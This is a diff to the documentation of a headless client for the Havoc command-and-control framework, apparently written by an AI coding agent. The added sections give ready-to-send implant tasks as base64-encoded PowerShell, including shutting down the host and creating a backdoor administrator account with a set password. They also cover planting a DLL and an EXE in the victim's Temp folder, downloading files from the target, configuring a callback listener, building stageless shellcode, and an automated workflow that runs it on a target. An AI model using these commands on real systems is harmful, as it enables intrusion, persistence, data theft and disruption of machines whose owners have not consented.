@@ -51,6 +51,150 @@ When replicating higher-level console actions (such as `shell`), translate the Q
 
 That format mirrors `CommandExecute::ProcModule` inside the Qt source. `ProcCommand=4` selects the “create process” branch and the trailing base64 value (`L2Mgd2hvYW1p`) is the encoded `/c whoami` argument block that the demon expects. Use the other helpers in `client/src/Havoc/Demon/CommandSend.cc` as a reference when you script additional task types. 【F:client/src/Havoc/Demon/ConsoleInput.cc†L856-L877】【F:client/src/Havoc/Demon/CommandSend.cc†L284-L315】
 
+## Common command translations
+
+The Qt console also hides a fair amount of bookkeeping when it fires Python modules or file-system helpers. The headless CLI can reproduce the same behaviour, but you must expand the high-level command into the raw task payload yourself. Replace `<agent-id>` with the demon identifier shown by the `agents` command.
+
+### PowerShell one-liners
+
+Use the process module (`CommandID 0x1010`) with `ProcCommand=4`. The `Args` field must contain the literal string `0;FALSE;TRUE;` followed by the PowerShell path and a base64-encoded command line. The examples below mirror the Qt client’s `powershell` helper.
+
+```text
+task <agent-id> 0x1010 powershell ProcCommand=4 Args=0;FALSE;TRUE;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe;LUMgW1N5c3RlbS5FbnZpcm9ubWVudF06OkdldEVudmlyb25tZW50VmFyaWFibGUoIlBhdGgiLCAiTWFjaGluZSIp
+task <agent-id> 0x1010 powershell ProcCommand=4 Args=0;FALSE;TRUE;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe;LUMgW1N5c3RlbS5FbnZpcm9ubWVudF06OkdldEVudmlyb25tZW50VmFyaWFibGUoIlBhdGgiLCAiVXNlciIp
+task <agent-id> 0x1010 powershell ProcCommand=4 Args=0;FALSE;TRUE;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe;LUMgU3RvcC1Db21wdXRlcg==
+```
+
+The three commands above retrieve the machine `PATH`, the user `PATH`, and issue `Stop-Computer`, respectively.
+
+### File uploads and downloads
+
+File operations use `CommandID 15` (`COMMAND_FS`). Supply a `SubCommand` string and the encoded `Arguments` value that the demon expects. Paths are UTF-8 strings encoded with base64, matching the GUI implementation in `CommandExecute::FS` and the server-side translation in `teamserver/pkg/agent/demons.go`.
+
+```text
+# Upload local DLL to %LOCALAPPDATA%\Temp
+task <agent-id> 15 upload SubCommand=upload Arguments=QzpcXFVzZXJzXFxBbGljZSBNYWxpY2VcXEFwcERhdGFcXExvY2FsXFxUZW1wXFxXcHRzRXh0ZW5zaW9ucy5kbGw=<base64-data>
+
+# Upload local EXE to %LOCALAPPDATA%\Temp
+task <agent-id> 15 upload SubCommand=upload Arguments=QzpcXFVzZXJzXFxBbGljZSBNYWxpY2VcXEFwcERhdGFcXExvY2FsXFxUZW1wXFxzdW1tb24uZXhl<base64-data>
+
+# Download individual files from C:\
+task <agent-id> 15 download SubCommand=download Arguments=Qzpcc2FtYW50aGEudHh0
+task <agent-id> 15 download SubCommand=download Arguments=Qzpcc3lzdGVtaWMudHh0
+task <agent-id> 15 download SubCommand=download Arguments=Qzpcc2VjdXJpdHkudHh0
+```
+
+Replace `<base64-data>` with the base64-encoded contents of the file you want to upload (for example, `base64 -w0 /home/kali/WptsExtensions.dll`). When you queue a download the server streams the file back through the standard transfer channel, exactly as if you had used the GUI.
+
+### Local account management
+
+The GUI wraps module logic around simple PowerShell or `net.exe` commands. From the headless client you can reuse the PowerShell pattern from above to create a user and add it to the Administrators group. For example:
+
+```text
+task <agent-id> 0x1010 powershell ProcCommand=4 Args=0;FALSE;TRUE;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe;bmV0IHVzZXIgQ2FzcGVyIElhbUFHaG9zdDEyMzQ1ISEhIC9hZGQ=
+task <agent-id> 0x1010 powershell ProcCommand=4 Args=0;FALSE;TRUE;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe;bmV0IGxvY2FsZ3JvdXAgQWRtaW5pc3RyYXRvcnMgQ2FzcGVyIC9hZGQ=
+```
+
+These two tasks create the `Casper` account with the provided password and add it to the local Administrators group. Swap in any other account-management one-liners you prefer (for example `New-LocalUser` / `Add-LocalGroupMember`).
+
+### About Python modules
+
+Qt modules such as `samdump` run inside the GUI process and emit whatever low-level tasks the demon needs. The headless CLI does not embed the Python runtime, so module commands are unavailable unless you port their implementation into your automation. Use the C++ helpers referenced above to see which raw tasks a given module sends before recreating it in Go, Python, or another scripting language.
+
+## Provisioning listeners and payloads
+
+### Create listeners programmatically
+
+The Qt client populates the `Listener.Add` payload with the same key/value pairs the dialog collects (name, bind address, host rotation, ports, proxy settings, and headers).【F:client/src/UserInterface/Dialogs/Listener.cc†L618-L697】 When the teamserver receives that package it persists the handler configuration and broadcasts the listener summary back to every client.【F:teamserver/cmd/server/listener.go†L220-L332】 The headless client can synthesise that exact package before it requests an agent build:
+
+```json
+{
+  "Head": {
+    "Event": 2,
+    "User": "Neo",
+    "Time": "06/10/2025 14:55:00"
+  },
+  "Body": {
+    "SubEvent": 1,
+    "Info": {
+      "Name": "training-http",
+      "Protocol": "HTTP",
+      "Status": "online",
+      "Secure": "false",
+      "Hosts": "0.0.0.0",
+      "HostBind": "0.0.0.0",
+      "HostRotation": "Round-Robin",
+      "PortBind": "8443",
+      "PortConn": "8443",
+      "Headers": "Server: training",
+      "Uris": "/,/health",
+      "UserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+      "HostHeader": "training.local",
+      "Proxy Enabled": "false"
+    }
+  }
+}
+```
+
+Send the JSON over the WebSocket as soon as authentication succeeds. Monitor `packager.Type.Listener.Add` responses to confirm the handler reports `Status == "Online"` before building payloads.
+
+### Request stageless shellcode builds
+
+The payload generator dialog wraps the same `Gate.Stageless` request you need for a headless workflow: the `Head` marks the message as one-time, and the `Body.Info` collection specifies the agent type, listener, output format, and JSON-encoded demon configuration.【F:client/src/UserInterface/Dialogs/Payload.cc†L220-L247】 The dispatcher unmarshals that JSON, selects the listener, and invokes the native builder before returning a `Gate.Stageless` package that contains the compiled bytes in `PayloadArray`.【F:teamserver/cmd/server/dispatch.go†L821-L925】【F:teamserver/pkg/events/gate.go†L12-L27】
+
+A minimal shellcode request therefore looks like:
+
+```json
+{
+  "Head": {
+    "Event": 5,
+    "User": "Neo",
+    "Time": "06/10/2025 14:55:02",
+    "OneTime": "true"
+  },
+  "Body": {
+    "SubEvent": 2,
+    "Info": {
+      "AgentType": "Demon",
+      "Listener": "training-http",
+      "Arch": "x64",
+      "Format": "Windows Shellcode",
+      "Config": "{\"Sleep\":\"5\",\"Jitter\":\"15\",\"Injection\":{\"Alloc\":\"Win32\",\"Execute\":\"Win32\",\"Spawn64\":\"C:\\\\Windows\\\\System32\\\\notepad.exe\",\"Spawn32\":\"C:\\\\Windows\\\\SysWOW64\\\\notepad.exe\"}}"
+    }
+  }
+}
+```
+
+Reuse the profile document broadcast during the login handshake (`packager.Type.InitConnection.Profile`) to seed the `Config` string so the builder receives the same defaults as the Qt client.【F:teamserver/pkg/events/events.go†L120-L138】 After the response arrives, base64-decode `PayloadArray` and persist it as the shellcode blob you will execute on the target host.
+
+## Automating sequential workflows
+
+The interactive REPL is convenient for ad-hoc operations, but training exercises usually need a deterministic workflow that provisions infrastructure, delivers an implant, and then executes operator commands in order. The headless protocol exposes everything required to orchestrate that sequence:
+
+1. Connect to the teamserver, authenticate, and collect the cached profile document you will reuse during payload builds.【F:teamserver/cmd/headless/headless.go†L31-L115】【F:teamserver/pkg/events/events.go†L120-L138】
+2. Add or update the listener you want to use for the engagement and wait until the server reports it as `Online`.【F:teamserver/cmd/server/listener.go†L220-L332】
+3. Submit a `Gate.Stageless` build request that references that listener, save the returned shellcode, and execute it on the target host.【F:client/src/UserInterface/Dialogs/Payload.cc†L220-L247】【F:teamserver/cmd/server/dispatch.go†L821-L925】
+4. Track the set of agent IDs that existed before the payload ran so you can recognise the new session when it checks in.【F:teamserver/pkg/events/demons.go†L17-L66】
+5. Queue the desired commands one at a time, writing console output to disk and decoding download callbacks before scheduling the next task.【F:teamserver/pkg/service/service.go†L360-L418】
+
+The repository now ships that end-to-end workflow under [`docs/examples/headless_workflow.py`](./examples/headless_workflow.py). It provisions an HTTP listener, requests a stageless x64 shellcode payload, saves the payload to `artifacts/demon.x64.bin`, waits for the new agent created by executing that shellcode, and then runs the command sequence discussed earlier. PowerShell output for the PATH queries is written to disk, uploads and downloads are mirrored to the `artifacts/` directory, and the local account creation commands are queued before `Stop-Computer` is issued as the final step. Module shortcuts such as `samdump` still require porting the Qt module logic into your automation before you can add them to the queue.
+
+Install the Python dependency once (`pip install websockets`) and adjust the defaults via CLI flags or environment variables:
+
+```bash
+python docs/examples/headless_workflow.py --help
+HAVOC_PASSWORD="super-secret" python docs/examples/headless_workflow.py \
+  --teamserver wss://127.0.0.1:40056/havoc/ \
+  --listener-name training-http \
+  --artifact-dir training_artifacts
+```
+
+The script blocks until each task reports output so the target never has more than one outstanding command. Every artefact (PowerShell output, uploaded/downloaded files, and the generated shellcode) ends up inside the configured `--artifact-dir`. Browse the source for additional integration ideas—helper functions such as `build_workflow` show how to construct new task queues, and `listener_payload`/`gate_payload` demonstrate how to synthesise GUI-equivalent packages in pure Python.
+
+
+
+Tune the CLI flags for your environment (teamserver URI, credentials, listener settings, and local file paths). The download handler writes the retrieved files alongside the other artefacts so you can distribute them with the training materials. Because the loop waits for each `Session.Output` package before moving forward, the agent never has more than one outstanding command and you get deterministic logs of every action.【F:teamserver/pkg/events/demons.go†L17-L66】【F:teamserver/pkg/service/service.go†L360-L418】
+
 ## 1. Understand the Transport
 
 * The Qt client connects to the teamserver over a WebSocket endpoint at `wss://<host>:<port>/havoc/` and ignores TLS validation errors. The same URI and TLS behaviour must be reproduced by the headless client. 【F:client/src/Havoc/Connector.cc†L10-L44】
